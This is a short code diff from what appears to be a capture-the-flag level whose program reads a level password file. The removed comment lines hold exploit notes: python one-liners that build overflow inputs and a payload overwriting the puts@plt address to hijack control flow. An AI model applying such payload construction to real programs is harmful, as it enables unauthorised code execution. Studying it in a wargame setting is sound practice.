@@ -26,8 +26,4 @@ int main(int argc, char **argv) {
   fgets(flag, 68, fopen("/home/user/level8/.pass", "r"));
   puts(str);
   return 0;
-  // $(python -c "print('A' * 20)") $(python -c "print('B' * 20)")
-  // puts@plt = 0x8049928
-  // $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c
-  // "print('\xf4\x84\x04\x08')")
 }
